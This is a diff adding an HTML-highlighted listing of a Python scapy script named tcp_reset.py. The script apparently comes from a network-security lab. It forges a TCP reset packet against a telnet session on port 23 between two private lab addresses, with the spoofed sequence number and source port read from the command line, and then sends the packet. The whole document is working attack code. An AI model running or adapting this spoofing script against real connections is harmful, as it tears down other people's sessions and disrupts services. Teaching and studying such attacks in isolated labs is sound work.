@@ -1,0 +1,24 @@
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<meta name="GENERATOR" content="GNU source-highlight 3.1.9
+by Lorenzo Bettini
+http://www.lorenzobettini.it
+http://www.gnu.org/software/src-highlite">
+<title>tcp_reset.py</title>
+</head>
+<body bgcolor="white">
+<pre><tt><i><font color="#9A1900">#!/usr/bin/python3</font></i>
+
+<b><font color="#000080">import</font></b> sys
+<b><font color="#000080">from</font></b> scapy<font color="#990000">.</font>all <b><font color="#000080">import</font></b> <font color="#990000">*</font>
+
+ip <font color="#990000">=</font> <b><font color="#000000">IP</font></b><font color="#990000">(</font>src<font color="#990000">=</font><font color="#FF0000">"192.168.100.101"</font><font color="#990000">,</font> dst<font color="#990000">=</font><font color="#FF0000">"192.168.100.3"</font><font color="#990000">)</font>
+tcp <font color="#990000">=</font> <b><font color="#000000">TCP</font></b><font color="#990000">(</font>dport<font color="#990000">=</font><font color="#993399">23</font><font color="#990000">,</font> sport<font color="#990000">=</font><b><font color="#000000">int</font></b><font color="#990000">(</font>sys<font color="#990000">.</font>argv<font color="#990000">[</font><font color="#993399">1</font><font color="#990000">]),</font> flags<font color="#990000">=</font><font color="#FF0000">"R"</font><font color="#990000">,</font> seq<font color="#990000">=</font><b><font color="#000000">int</font></b><font color="#990000">(</font>sys<font color="#990000">.</font>argv<font color="#990000">[</font><font color="#993399">2</font><font color="#990000">]))</font>
+pkt <font color="#990000">=</font> ip<font color="#990000">/</font>tcp
+<b><font color="#000000">ls</font></b><font color="#990000">(</font>pkt<font color="#990000">)</font>
+<b><font color="#000000">send</font></b><font color="#990000">(</font>pkt<font color="#990000">,</font>verbose<font color="#990000">=</font><font color="#993399">0</font><font color="#990000">)</font>
+</tt></pre>
+</body>
+</html>
